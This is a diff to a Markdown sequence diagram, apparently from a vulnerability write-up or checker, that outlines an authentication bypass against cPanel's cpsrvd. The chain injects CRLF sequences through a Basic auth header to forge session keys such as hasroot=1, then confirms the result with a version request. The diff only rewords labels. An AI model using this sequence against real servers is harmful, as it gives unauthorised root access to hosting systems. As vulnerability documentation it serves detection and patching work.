@@ -110,16 +110,16 @@ sequenceDiagram
     actor A as attacker
     participant C as cpsrvd
     participant S as session file
-    A->>C: POST /login/?login_only=1<br/>user=root&pass=wrong
-    C-->>A: Set-Cookie: whostmgrsession=NAME,OBHEX
-    A->>C: GET / · Authorization: Basic b64(root:x\r\n…)<br/>Cookie: whostmgrsession=NAME (OBHEX stripped)
-    C->>S: pass=x\r\nuser=root\r\nhasroot=1\r\n… (CRLFs land verbatim)
-    C-->>A: HTTP 307 · Location: /cpsess<10digits>/
+    A->>C: POST /login/?login_only=1 with user=root, pass=wrong
+    C-->>A: Set-Cookie · whostmgrsession=NAME,OBHEX
+    A->>C: GET / · Authorization Basic b64(root:x + CRLF payload) · Cookie minus OBHEX
+    C->>S: writes pass=x, user=root, hasroot=1, ... (CRLFs land verbatim)
+    C-->>A: HTTP 307 · Location /cpsess[10digits]/
     A->>C: GET /scripts2/listaccts · cookie only
-    C->>S: propagate raw → cache (forged keys readable)
-    C-->>A: 401 token denied (expected; side-effect already done)
-    A->>C: GET /cpsess<token>/json-api/version
-    C-->>A: 200 OK = VULN · 403 = SAFE
+    C->>S: propagate raw to cache · forged keys now readable
+    C-->>A: 401 token denied (side-effect already done)
+    A->>C: GET /cpsess[token]/json-api/version
+    C-->>A: 200 OK means VULN · 403 means SAFE
 ```
 
 Verdict is the HTTP code at request 4. The on-disk session file at
